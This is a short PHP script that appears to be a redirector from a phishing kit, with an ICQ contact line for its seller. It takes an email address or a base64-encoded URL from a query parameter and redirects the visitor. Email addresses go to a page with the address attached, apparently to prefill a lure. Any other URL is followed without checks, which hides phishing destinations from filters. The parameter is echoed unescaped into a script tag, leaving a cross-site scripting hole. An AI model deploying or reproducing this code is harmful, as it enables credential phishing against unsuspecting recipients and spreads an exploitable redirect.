<?php
/*  Need help? Contact ICQ: @anyhopes */
@session_start();
error_reporting(0);
set_time_limit(0);
$anyhopes   = $_GET['wildcard'];
if(preg_match("/@/",$anyhopes)){
	 echo "<script type=\"text/javascript\">window.location.href = \"https://example.com/#$anyhopes\"</script>\n";
	} else {
	$data = base64_decode($anyhopes);
		if(!preg_match("/(https|http)/",$data)){
	 	echo "<script type=\"text/javascript\">window.location.href = \"https://example.com/#$data\"</script>\n";
		} else {
	 	echo "<script type=\"text/javascript\">window.location.href = \"$data\"</script>\n";
	}
}
?>